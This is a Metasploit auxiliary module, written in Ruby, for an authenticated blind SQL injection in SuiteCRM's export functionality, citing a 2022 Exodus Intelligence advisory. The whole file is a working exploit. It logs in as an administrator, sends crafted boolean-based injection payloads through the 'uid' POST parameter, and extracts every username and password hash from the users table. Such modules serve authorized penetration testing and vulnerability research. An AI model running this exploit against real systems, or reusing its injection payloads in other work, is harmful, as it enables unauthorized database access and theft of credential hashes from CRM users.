##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SuiteCRM authenticated SQL injection in export functionality',
        'Description' => %q{ },
        'Author' => [
          'Exodus Intelligence', # Advisory
          'jheysel-r7', # poc + msf module
          'Redouane NIBOUCHA <rniboucha@yahoo.fr>' # sql injection help
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://blog.exodusintel.com/2022/06/09/salesagility-suitecrm-export-request-sql-injection-vulnerability/']
        ],
        # TODO: - update actions
        #
        'Actions' => [
          ['Dump tables', { 'Description' => 'Dumps database tables' }]
        ],
        'DefaultAction' => 'Dump tables',
        'DisclosureDate' => '2022-07-27',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'Privileged' => true
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),
      OptString.new('USERNAME', [true, 'Username of user with administrative rights', 'admin']),
      OptString.new('PASS', [true, 'Password for administrator', 'admin']),
    ]
  end

  def authenticate
    print_status("Authenticating as #{datastore['USERNAME']}")
    initial_req = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Users',
          'action' => 'Login'
        }
      }
    )

    return false unless initial_req && initial_req.code == 200

    login = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_post' => {
          'module' => 'Users',
          'action' => 'Authenticate',
          'return_module' => 'Users',
          'return_action' => 'Login',
          'user_name' => datastore['USERNAME'],
          'username_password' => datastore['PASS'],
          'Login' => 'Log In'
        }
      }
    )

    return false unless login && login.code == 302

    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Administration',
          'action' => 'index'
        }
      }
    )

    auth_succeeded?(res)
  end

  def auth_succeeded?(res)
    return false unless res

    if res.code == 200
      print_good("Authenticated as: #{datastore['USERNAME']}")
      if res.body.include?('Unauthorized access to administration.')
        print_warning("#{datastore['USERNAME']} does not have administrative rights! Exploit will fail.")
        @is_admin = false
      else
        print_good("#{datastore['USERNAME']} has administrative rights.")
        @is_admin = true
      end
      @authenticated = true
      true
    else
      print_error("Failed to authenticate as: #{datastore['USERNAME']}")
      false
    end
  end

  def request(uid)
    res = send_request_cgi({
      'method' => 'POST',
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
      'encode_params' => false,
      'vars_post' => {
        'uid' => uid,
        'module' => 'Accounts',
        'action' => 'index'
      }
    })
    res
  end

  # @return an array of usernames
  def get_user_names(sqli)
    users_encoded = sqli.run_sql("select to_base64(group_concat(user_name)) from users")
    Rex::Text.decode_base64(users_encoded).split(',')
  end

  # Use blind boolean SQL injection to determine the user_hashes of given usernames
  def get_user_hashes(sqli, users)
    users.map{|username|
      [ username, sqli.run_sql("select user_hash from users where user_name='#{username}'") ]
    }
  end

  def init_sqli
    wrong_resp_length = request(",\\,))+AND+1=2;+--+")&.body&.length
    sqli = create_sqli(dbms: MySQLi::BooleanBasedBlind, opts: { hex_encode_strings: true }) do|payload|
      fail_with(Failure::BadConfig, 'comma in payload') if payload.include?(',')
      length1 = request(",\\,))+OR+(#{payload});+--+")&.body&.length
      length1 != wrong_resp_length
    end

    # redefine blind_detect_length and blind_dump_data because of the bad characters the payload cannot include

    def sqli.blind_detect_length(query, timebased=false)
      output_length = 0
      loop do
        break if blind_request("length(cast((#{query}) as binary))=#{output_length}")
        output_length += 1
      end
      output_length
    end

    def sqli.blind_dump_data(query, length, known_bits=0, bits_to_guess=8, timebased=false)
      charset = 32.upto(126).to_a + 32.times.to_a + 127.upto(255).to_a

      # MySQL like operator considers the following characters as wildcards
      [ '%', '_'].each do|char|
        charset.delete(char.ord)
      end

      output = [ ]
      length.times do|j|
        character = charset.detect{|byte|
          blind_request("(select case when ((#{query})+like+binary "\
          "0x#{output.map{|e|e.to_s(16).rjust(2,?0)}.join}#{byte.to_s(16).rjust(2,?0)}25)"\
          " then 1 else 2 end)=1")
        }
        character = '?' if character.nil? # can be '_' or '%'
        output << character;
      end
      output.map(&:chr).join
    end

    sqli
  end

  def run_host(_ip)
    authenticate unless @authenticated
    fail_with Failure::NoAccess, 'Unable to authenticate to SuiteCRM' unless @authenticated
    sqli = init_sqli
    users = get_user_names(sqli)
    print_status "users = #{users.to_s}"
    hashes = get_user_hashes(sqli, users)
    hashes.each do|(username, hash)|
      print_good "username : #{username} ; hash : #{hash}"
    end
  end
end
